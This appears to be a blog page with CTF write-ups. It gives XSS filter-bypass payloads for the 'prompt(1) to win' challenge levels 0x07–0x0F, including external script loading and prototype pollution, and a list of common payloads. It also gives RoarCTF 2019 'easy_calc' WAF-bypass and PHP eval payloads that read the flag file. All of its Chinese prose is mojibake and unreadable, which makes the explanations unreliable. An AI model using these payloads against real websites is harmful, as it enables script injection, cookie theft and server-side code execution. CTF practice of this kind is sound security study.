<p>è¿™ä¸ªtrickæŒºæœ‰æ„æ€çš„ï¼Œæˆ‘ä¹‹å‰æ²¡çœ‹åˆ°è¿‡ã€‚</p>
<p>è¿™é‡Œåœ¨actionçš„åœ°æ–¹å¯ä»¥é€šè¿‡javascriptä¼ªåè®®æ¥è§¦å‘xssï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªå¯¹actionæ ‡ç­¾çš„æ£€æµ‹ï¼Œä¸è¿‡è¿™é‡Œå…è®¸æˆ‘ä»¬è‡ªå·±æ·»åŠ ï¼Œæˆ‘ä»¬åœ¨åé¢æ·»åŠ ä¸€ä¸ªactionå°±å¯ä»¥bypassè¿™ä¸ªæ­£åˆ™äº†</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFgJ1O.png" alt="KFgJ1O.png"></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™å®šäº†12ä¸ªå­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;      &#x2F;* *&#x2F;     &lt;!-- --&gt;    &lt;!-- --!&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬ç”¨äºBypasså’Œè¿‡æ»¤çš„æ³¨é‡Šç¬¦</p>
<p>è¿˜è¡Œï¼ŒæŒºç®€å•çš„bypass,ç”¨jsçš„æ³¨é‡Šç¬¦å¤šè¡Œæ³¨é‡Šä¸€ä¸‹å°±è¡Œ</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt(&#x2F;*#*&#x2F;1)&#x2F;*#*&#x2F;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­¦åˆ°äº†ï¼ŒåŸæ¥åœ¨Jsä¸­ä¸å…‰æœ‰\r\nè¿™ç§æ¢è¡Œç¬¦ï¼Œè¿˜æœ‰ç¥å¥‡çš„unicodeå­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u2028prompt(1)\u2028--&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFT92R.png" alt="KFT92R.png"></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹è¿‡code-breakingçš„nodechrï¼Œä¹Ÿå°±ä¼šäº†ï¼Œä¸è¿‡è¿˜è¦æ³¨æ„çš„æ˜¯jså¯¹å¤§å°å†™æ˜¯æ•æ„Ÿçš„ï¼Œæ‰€ä»¥å¿…é¡»å¼•å…¥å¤–éƒ¨js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Å¿cript src=<span class="string">"http://xxxtest.js"</span>&gt;&lt;<span class="regexp">/Å¿cript&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// â”¬â”€â”€â”¬ ï»¿ãƒ( ã‚œ-ã‚œãƒ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ /(.â–¡. \ï¼‰DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å‡ºçš„å°±å¾ˆæ²¡æ„æ€äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prom&#39;pt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))instanceof"</span></span><br></pre></td></tr></table></figure>

<p>ä¸€å¼ å›¾çœ‹æ‡‚ï¼Œå³ä½¿æŠ¥é”™ï¼Œä¹Ÿèƒ½xss</p>
<p><img src="https://s2.ax1x.com/2019/10/17/KEhYaF.png" alt="KEhYaF.png"></p>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ãƒâ”¬â”€â”¬ãƒ ï¸µ ( \oÂ°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥æƒ³ç€ç”¨fromCharCodeæ¥ç€ï¼Œåé¢å‘ç°é€—å·è¢«urlç¼–ç äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸‹é¢çš„è¿™ä¸ªæ•°å­—è½¬æ¢è¿›è¡Œæ¥ä»£æ›¿</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval((630038579).toString(30))(1)</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§æ¯”è¾ƒæœ‰æ„æ€çš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for((i)in(self))eval(i)(1)</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å¾ªç¯æ‹¿åˆ°selfé‡Œé¢çš„å‡½æ•°ï¼Œæ¥è¿›è¡Œprompt</p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¸å‹çš„åŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡åé¢çš„æ­£åˆ™æ“ä½œæœ‰ä¸¶æ„æ€ï¼Œä¹‹å‰æ²¡äº†è§£è¿‡</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&#123;&#125;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸‹</p>
<p>ç›´æ¥ç²˜äº†å…ˆçŸ¥ä¾‹å­äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"test"</span>)</span><br><span class="line"><span class="string">"11test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$`test"</span>)</span><br><span class="line"><span class="string">"1111test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$'test"</span>)</span><br><span class="line"><span class="string">"1123344test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$&amp;test"</span>)</span><br><span class="line"><span class="string">"112test23344"</span></span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢ä¾‹å­æ˜“å¾—æ­¤payload</p>
<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJP</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹payloadï¼Œä¸è¿‡æµ‹è¯•å¤±è´¥ã€‚</p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>svg xss å­¦åˆ°äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™é‡Œç”¨çš„æ˜¯Htmlçš„æ³¨é‡Šï¼Œæ‰€ä»¥å¿…é¡»åŠ ä¸ªsvgæ ‡ç­¾</p>
<p>svgé…åˆå®ä½“ç¼–ç bypassä¹Ÿæ˜¯å¾ˆå¸¸ç”¨çš„æ“ä½œ</p>
<h3 id="ä¸€äº›å¸¸ç”¨çš„Payload"><a href="#ä¸€äº›å¸¸ç”¨çš„Payload" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„Payload"></a>ä¸€äº›å¸¸ç”¨çš„Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line"></span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus&#x3D;javascript:alert(1) autofocus&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
<p><a href="https://xz.aliyun.com/t/4507#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4507#toc-4</a></p>
<p><a href="https://wooyun.js.org/drops/xssæŒ‘æˆ˜èµ›writeup.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html</a></p>
<p><a href="http://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/20/prompt-1-to-win/" data-id="ckabsu38z0030kkvr0g5l9qbm" class="article-share-link" data-share="baidu" data-title="prompt(1) to win">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/20/prompt-1-to-win/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Roarctf2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/20/Roarctf2019/" class="article-date">
  <time datetime="2019-10-20T12:21:06.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/Roarctf2019/">Roarctf2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>è¿™é¢˜åé¢çš„ä»£ç bypassæŒºç®€å•çš„ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ª</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯jQueryå…ˆæ˜¯ä¼ ç»™äº†wafï¼Œwafé‡åˆ°å­—ç¬¦å°±403</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdvNR.png" alt="KpdvNR.png"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯é‡‡ç”¨?numä¼ ç»™wafçš„ï¼Œæ‰€ä»¥?%20numå°±å¯ä»¥Bypassæ‰wafäº†ï¼Œç›´æ¥ä¼ ç»™calc.phpæ­£å¸¸æ‰§è¡Œäº†ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20num&#x3D;1;var_dump(readfile(hex2bin(base_convert(52115961636711,10,16))))</span><br><span class="line">&#x2F;&#x2F;æ›´ç®€å•çš„ä¸€ç‚¹çš„payload</span><br><span class="line">%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™é“é¢˜æˆ‘é‡ç‚¹æƒ³è¯´äº†è¿˜æ˜¯E99è¿™ä½å¸ˆå‚…payloadï¼Œå¤ªç¡¬æ ¸äº†ï¼Œè†œã€‚</p>
<p>é€šè¿‡1/0å¾—åˆ°INFä»¥åŠ0/0æ‹¿åˆ°NANå»æ„é€ payload,å¹¶ä¸”é€šè¿‡ä½è¿ç®—æ‹¿åˆ°æ–°çš„å­—ç¬¦</p>
<p>Fuzzçš„è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŒ‰è¿™ä¸ªæ„æ€ï¼Œæ„é€ äº†ä¸€ä¸ªphpinfo()æ¥å­¦ä¹ äº†ä¸€æ³¢</p>
